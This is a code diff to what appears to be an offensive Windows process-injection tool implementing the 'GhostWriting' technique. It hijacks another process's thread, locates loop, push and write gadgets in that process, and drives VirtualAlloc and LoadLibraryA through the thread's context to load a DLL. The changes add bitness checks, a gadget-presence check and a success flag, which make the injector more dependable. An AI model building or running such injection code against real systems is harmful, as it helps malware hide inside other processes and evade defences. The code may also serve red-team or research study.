@@ -4,30 +4,14 @@
 #include "../Common/Utils.h"
 #include "../Common/Process.h"
 
-namespace
-{
-    bool is32BitsThread(HANDLE threadHandle)
-    {
-        DWORD pid = GetProcessIdOfThread(threadHandle);
-        HANDLE procHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION , false, pid);
-        BOOL isWow64 = false;
-        if (!IsWow64Process(procHandle, &isWow64))
-        {
-            std::cerr << "IsWow64Process error " << GetLastError() << std::endl;
-        }
-        CloseHandle(procHandle);
-        return isWow64;
-    }
-}
-
-GhostWriter::GhostWriter(DWORD threadID)
+GhostWriter::GhostWriter(DWORD threadID, bool is32Bits)
 {
     this->threadHandle = OpenThread(THREAD_ALL_ACCESS, FALSE, threadID);
     if (!this->threadHandle)
     {
         ThrowException(std::string("GhostWriter: OpenThread error ") + std::to_string(GetLastError()));
     }
-    this->is32Bits = is32BitsThread(this->threadHandle);
+    this->is32Bits = is32Bits;
 }
 
 HANDLE GhostWriter::GetThreadHandle()
@@ -191,6 +175,28 @@ void GhostWriter::CallWriteGadget(uintptr_t what, uintptr_t where)
 
 namespace
 {
+    bool is32BitsThread(DWORD threadID)
+    {
+        HANDLE threadHandle = OpenThread(THREAD_QUERY_LIMITED_INFORMATION, false, threadID);
+        if (!threadHandle)
+        {
+            std::cerr << "OpenThread error " << GetLastError() << std::endl;
+            return false;
+        }
+
+        DWORD pid = GetProcessIdOfThread(threadHandle);
+        CloseHandle(threadHandle);
+
+        HANDLE procHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid);
+        BOOL isWow64 = false;
+        if (!IsWow64Process(procHandle, &isWow64))
+        {
+            std::cerr << "IsWow64Process error " << GetLastError() << std::endl;
+        }
+        CloseHandle(procHandle);
+        return isWow64;
+    }
+
     uintptr_t CallVirtualAlloc(GhostWriter& ghostWriter, uintptr_t virtualAllocAddr)
     {
         ThreadContext context = ThreadContext(ghostWriter.is32Bits);
@@ -304,12 +310,18 @@ namespace
 bool GhostWritingInjection(DWORD threadID, PE& dll)
 {
     bool success = false;
-    GhostWriter ghostWriter = GhostWriter(threadID);
+    GhostWriter ghostWriter = GhostWriter(threadID, is32BitsThread(threadID));
     Process proc = Process(GetProcessIdOfThread(ghostWriter.GetThreadHandle()));
+
+    if (ghostWriter.is32Bits != dll.is32Bits)
+    {
+        std::cerr << "Process and dll bitness are different!\n";
+        return false;
+    }
 
     if (proc.Open(PROCESS_QUERY_LIMITED_INFORMATION))
     {
-        ThreadContext originalContext = ThreadContext(proc.is32Bits);
+        ThreadContext originalContext = ThreadContext(ghostWriter.is32Bits);
         ThreadContext context = ThreadContext(ghostWriter.is32Bits);
         unsigned int ptrSize = ghostWriter.is32Bits ? 4 : 8;
 
@@ -325,6 +337,12 @@ bool GhostWritingInjection(DWORD threadID, PE& dll)
         BYTE* loopGadgetAddr = FindLoopGadget(proc);
         BYTE* pushGadgetAddr = FindPushGadget(proc);
         BYTE* writeGadgetAddr = FindWriteGadget(proc);
+
+        if (!loopGadgetAddr || !pushGadgetAddr || !writeGadgetAddr)
+        {
+            std::cerr << "Could not find all required gadgets\n";
+            return false;
+        }
 
         std::cout << std::hex;
         std::cout << "Loop gadget address: 0x" << (uintptr_t)loopGadgetAddr << "\n";
@@ -366,6 +384,7 @@ bool GhostWritingInjection(DWORD threadID, PE& dll)
         CallLoadLibraryA(ghostWriter, loadLibraryAAddr, memoryPageAddr);
         std::cout << "Done!" << std::endl;
 
+        success = true;
         proc.Close();
     }
     else
